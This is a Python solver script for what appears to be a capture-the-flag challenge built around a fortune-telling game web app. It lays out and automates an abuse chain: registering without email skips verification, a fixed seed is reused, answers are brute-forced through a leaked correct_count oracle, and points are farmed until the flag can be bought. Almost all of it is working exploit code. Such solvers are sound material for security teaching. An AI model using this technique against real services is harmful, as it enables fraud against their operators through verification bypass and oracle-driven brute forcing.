#!/usr/bin/env python3
"""Лавка предсказаний solver — same-seed brute force via the correct_count oracle.

Abuse chain:
  1. Register WITHOUT email  -> backend skips the email-code step entirely.
  2. Pick ONE seed and reuse it forever -> /api/start_game accepts any seed any
     number of times, and a seed fully determines the round (board + answers).
  3. /api/submit leaks `correct_count`. Hold 4 questions fixed and sweep the 5th
     across its options: the option that raises correct_count is the right one.
     5 questions * 6 options = ~30 same-seed games recover the whole answer key
     with zero PRNG reversing.
  4. Replay the recovered answers on the SAME seed to farm points until we can
     afford the flag, then buy it and read the message.

Stdlib only.
    python3 solve.py [--url http://127.0.0.1:13438] [--expect '<flag>']
"""
import argparse
import json
import secrets
import sys
import urllib.error
import urllib.request


def call(url, path, token=None, body=None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url + path, data=data, method="POST" if data else "GET")
    req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", "Bearer " + token)
    try:
        with urllib.request.urlopen(req) as resp:
            return json.loads(resp.read())
    except urllib.error.HTTPError as e:
        try:
            return json.loads(e.read())
        except Exception:
            raise


def start(url, token, seed):
    return call(url, "/api/start_game", token, {"seed": seed})


def submit(url, token, game_id, guesses):
    return call(url, "/api/submit", token, {"game_id": game_id, "guesses": guesses})


def recover_answers(url, token, seed):
    """Recover the 5 correct answers for `seed` using the correct_count oracle."""
    game = start(url, token, seed)
    # Questions are deterministic for a seed; order them 0..n-1 to match scoring.
    questions = sorted(game["questions"], key=lambda q: q["id"])
    base = [q["options"][0] for q in questions]  # filler guess

    answers = list(base)
    for i, q in enumerate(questions):
        best_opt, best_count = q["options"][0], -1
        for opt in q["options"]:
            guess = list(base)
            guess[i] = opt
            gid = start(url, token, seed)["game_id"]  # fresh game, SAME seed
            cc = submit(url, token, gid, guess)["correct_count"]
            if cc > best_count:
                best_count, best_opt = cc, opt
        answers[i] = best_opt
        print(f"  q{i} ({q['label']}): {best_opt}")
    return answers


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", default="http://127.0.0.1:13438")
    ap.add_argument("--user", default="s" + secrets.token_hex(5))
    ap.add_argument("--password", default="p" + secrets.token_hex(8))
    ap.add_argument("--expect", default=None, help="flag to assert at the end")
    args = ap.parse_args()
    url = args.url.rstrip("/")

    # 1) Account without email -> no code step.
    call(url, "/api/register", body={"username": args.user, "password": args.password})
    token = call(url, "/api/login", body={"username": args.user, "password": args.password})["access_token"]
    print("[+] logged in (no email, no code)")

    # 2) One seed, reused everywhere.
    seed = call(url, "/api/get_config", token=token)["seed"]
    print(f"[+] abusing single seed: {seed}")

    # 3) Brute-force the answer key for that seed via the oracle.
    print("[*] recovering answers via correct_count oracle...")
    answers = recover_answers(url, token, seed)

    res = submit(url, token, start(url, token, seed)["game_id"], answers)
    if not res["correct"]:
        print("[-] recovery failed", file=sys.stderr)
        return 1
    print(f"[+] recovered! perfect round, balance={res['balance']}")

    # 4) Farm points on the same seed until we can buy the flag, then buy it.
    shop = call(url, "/api/shop", token=token)
    flag_item = next(p for p in shop["products"] if p["id"] == "flag")
    price = flag_item["price"]
    balance = res["balance"]
    print(f"[*] flag costs {price}, farming same-seed rounds...")
    while balance < price:
        r = submit(url, token, start(url, token, seed)["game_id"], answers)
        balance = r["balance"]
        if balance % 50 == 0:
            print(f"    balance={balance}")

    buy = call(url, "/api/buy", token=token, body={"product_id": "flag"})
    flag = buy.get("message", "")
    print("[+] FLAG:", flag)
    if args.expect is not None and flag != args.expect:
        print(f"[-] flag mismatch: expected {args.expect!r}", file=sys.stderr)
        return 1
    if not flag:
        print("[-] empty flag", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
